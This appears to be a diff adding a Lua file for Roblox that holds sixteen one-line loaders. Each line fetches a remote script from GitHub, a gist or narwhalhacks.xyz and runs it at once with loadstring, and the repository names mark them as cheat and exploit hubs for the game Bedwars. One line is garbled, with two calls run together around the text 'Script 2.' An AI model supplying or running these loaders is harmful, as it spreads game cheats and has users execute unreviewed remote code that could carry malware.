@@ -1,0 +1,16 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mlartix/Roblox-Bedwars/main/ElderTreeOrbESP.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joeengo/Future/main/loadstring.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlaveDash/Crokuranu/main/Bedwars%20UI%20Source%20Code"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/bedlol.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DignityDC/opgui/main/Bedwars"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlaveDash/Crokuranu/main/Bedwars%20UI%20Source%20Code"))() Script 2.loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/bedlol2"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperGamingBros4/Roblox-HAX/main/Updated_Totally_Original_Script_Hub.Lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuriWasTaken/MonkeHub/main/Loader.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxhubs/robloxscript/main/script.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuriWasTaken/MonkeyScripts/main/BedWarsMonkey.lua"))();
+loadstring(game:HttpGet("https://gist.githubusercontent.com/DeveloperMikey/2b8ee3d5a38c56c2cc1db72554850384/raw/bedwar.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamondHands-Exploit/BedWarsExploit/main/Source.lua"))();
+loadstring(game:HttpGet("http://www.narwhalhacks.xyz/NeonHub/Main.lua", true))();
